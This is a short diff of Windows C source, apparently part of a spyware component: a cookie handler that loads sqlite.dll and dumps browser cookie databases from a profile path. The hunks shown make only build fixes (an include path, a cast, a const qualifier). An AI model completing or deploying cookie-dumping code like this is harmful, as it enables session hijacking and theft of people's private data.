@@ -1,7 +1,7 @@
 #include <windows.h>
 #define _CRT_SECURE_NO_WARNINGS 1
 #include <stdio.h>
-#include "..\\common.h"
+#include "../../H4DLL/common.h"
 #include "CookieHandler.h"
 
 // SQLITE Library functions 
@@ -25,7 +25,7 @@ int static InitSocialLibs()
 {
 	char buffer[MAX_PATH];
 
-	if (!(libsqlsc = LoadLibrary(HM_CompletePath("sqlite.dll", buffer)))) 
+	if (!(libsqlsc = LoadLibrary(HM_CompletePath((char *)"sqlite.dll", buffer)))) 
 		return 0;
 	
 	// sqlite functions
@@ -85,7 +85,7 @@ int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azC
 	return 0;
 }
 
-int static DumpSqliteCookies(WCHAR *profilePath, WCHAR *signonFile)
+int static DumpSqliteCookies(WCHAR *profilePath, const WCHAR *signonFile)
 {
 	void *db;
 	char *ascii_path;
